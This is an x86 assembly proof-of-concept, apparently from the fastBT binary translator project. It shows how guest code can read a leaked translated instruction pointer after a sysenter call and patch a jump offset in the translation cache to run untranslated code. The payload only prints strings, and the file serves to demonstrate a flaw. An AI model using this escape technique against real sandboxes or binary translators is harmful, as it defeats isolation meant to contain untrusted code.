 
# This program demonstrates how it is possible to break out of the translated 
# code in fastBT if the real instruction pointer (of the translated code 
# that is being executed) is accessible to the guest code.
# This is the case if we execute a system call with the sysenter mechanism 
# (call *%gs:0x10). In this case, the (translated) return instruction pointer 
# has to be on the stack (courtesy of prepare_sysenter) and is then accessible 
# to the guest code in -4(%esp) if we don't happen to be at a page boundary on 
# the stack.
# With some experimentation, it is possible to patch a relative jump offset 
# in the translation cache from the guest code itself, so that it jumps to 
# untranslated code.

	.section .rodata
.mystring1:
	.string "foo bar\n"
.mystring2:
	.string "hello world\n"
.mystring3:
	.string "hi there\n"


	.text
	.globl main
	.type	main, @function
	.type	func, @function
main:
	pushl %ebp
	movl %esp, %ebp
	
	# call the function, so that its code is translated
	# this will cause the jump further down not to be inlined (jmp func)
	call func
	
	# print string
	movl $4, %eax
	movl $1, %ebx
	movl $.mystring1, %ecx
	movl $8, %edx
	
	/* 
	 * Invoke print syscall; this jumps to system call handler in the vdso 
	 * that contains a sysenter instruction. The sysenter is preceded in 
	 * fastBT by a call to prepare_sysenter.
	 */
	call *%gs:0x10

	/* 
	 * When executed with fastBT, the real instruction pointer is now 
	 * accessible to the guest code at -4(%esp), because the prepare_sysenter 
	 * handler placed it there. The next few instructions calculate the 
	 * offset (for a relative jump) to the untranslated version of the 
	 * function "func". Then the address of the offset argument of the jmp 
	 * instruction is calculated and overwritten.
	 */
	movl $func, %ecx		# 5 bytes, address of transl. instr is at -4(%esp)
	subl -4(%esp), %ecx		# 4 bytes, offset to untranslated func into %ecx
	subl $31, %ecx			# 3 bytes
	movl -4(%esp), %edx		# 4 bytes, address of jmp offset arg into %edx...
	addl $27, %edx			# 3 bytes
	movl %ecx, (%edx)		# 2 bytes
	pushl $rip				# 5 bytes
	jmp func	# 1 byte opcode, 4 bytes offset; backpatch this offset
rip:
	# print string
	movl $4, %eax
	movl $1, %ebx
	movl $.mystring3, %ecx
	movl $9, %edx
	call *%gs:0x10
	
	movl $0, %eax
	leave
	ret
	
	
func:
	pushl %ebp
	movl %esp, %ebp
	
	# print string
	movl $4, %eax
	movl $1, %ebx
	movl $.mystring2, %ecx
	movl $12, %edx
	call *%gs:0x10
	
	movl $0, %eax
	leave
	ret
	
